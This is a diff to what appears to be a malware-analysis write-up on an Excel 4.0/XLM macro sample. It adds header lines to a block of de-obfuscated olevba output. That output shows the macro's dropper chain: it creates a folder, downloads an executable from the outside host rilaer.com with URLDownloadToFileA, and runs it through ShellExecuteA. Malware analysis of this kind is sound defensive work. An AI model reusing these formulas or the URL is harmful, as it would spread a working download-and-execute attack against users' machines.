@@ -132,6 +132,10 @@ $ olevba sample1-fb5ed444ddc37d748639f624397cff2a.bin
 Regardless of the technique followed, both tool dump the same de-obfuscated macro content, as shown below:
 
 ```bash
+' - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+' EMULATION - DEOBFUSCATED EXCEL4/XLM MACRO FORMULAS:
+...
+...
 ' CELL:DW1337    , FullEvaluation      , CALL("Kernel32","CreateDirectoryA","JCJ","C:\jhbtqNj\IOKVYnJ",0)
 ' CELL:DW1338    , FullEvaluation      , CALL("URLMON","URLDownloadToFileA","JJCCJJ",0,"http://rilaer.com/IfAmGZIJjbwzvKNTxSPM/ixcxmzcvqi.exRUN(SOCWNEScLLxkLhtJp!DW1337)","C:\jhbtqNj\IOKVYnJ\KUdYCRk.exe",0,0)
 ' CELL:DW1339    , FullEvaluation      , CALL("Shell32","ShellExecuteA","JJCCCCJ",0,"Open","C:\jhbtqNj\IOKVYnJ\KUdYCRk.exe",,0,0)
